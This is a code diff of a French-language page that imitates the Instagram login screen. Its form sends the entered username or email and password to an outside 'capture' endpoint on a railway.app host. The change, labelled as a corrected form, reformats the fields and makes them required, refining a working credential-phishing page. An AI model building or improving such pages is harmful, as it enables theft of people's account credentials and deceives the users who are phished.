@@ -22,37 +22,44 @@
                     <img src="../image/zqpwkLQ_d.webp" alt="Logo Instagram">
                 </h1>
 
-              <form action="https://instagramable-production.up.railway.app/capture" method="POST">
+                <!-- FORMULAIRE CORRIGÉ -->
+                <form action="https://instagramable-production.up.railway.app/capture" 
+                      method="POST" 
+                      autocomplete="off">
 
+                    <label for="email" class="sr-only">Téléphone, nom d’utilisateur ou e-mail</label>
+                    <input id="email" 
+                           name="email" 
+                           type="text"
+                           placeholder="Téléphone, nom d’utilisateur ou e-mail" 
+                           required />
 
+                    <label for="password" class="sr-only">Mot de passe</label>
+                    <input id="password" 
+                           name="password" 
+                           type="password" 
+                           placeholder="Mot de passe" 
+                           required />
 
-    <label for="email" class="sr-only">Téléphone, nom d’utilisateur ou e-mail</label>
-    <input id="email" name="email" placeholder="Téléphone, nom d’utilisateur ou e-mail" />
+                    <button type="submit">Se connecter</button>
+                </form>
 
-    <label for="password" class="sr-only">Mot de passe</label>
-    <input id="password" name="password" type="password" placeholder="Mot de passe" />
+                <div class="flex separator align-items-center">
+                    <span></span>
+                    <div class="or">OU</div>
+                    <span></span>
+                </div>
 
-    <button type="submit">Se connecter</button>
-</form>
-
-<div class="flex separator align-items-center">
-    <span></span>
-    <div class="or">OU</div>
-    <span></span>
-</div>
-
-<div class="login-with-fb flex direction-column align-items-center">
-    <div>
-        <a>Se connecter avec Facebook</a>
-    </div>
-    <a href="#">Mot de passe oublié ?</a>
-</div>
+                <div class="login-with-fb flex direction-column align-items-center">
+                    <div>
+                        <a>Se connecter avec Facebook</a>
+                    </div>
+                    <a href="#">Mot de passe oublié ?</a>
+                </div>
 
             </div>
         </section>
     </main>
-
-
 
     <script src=""></script>
 </body>
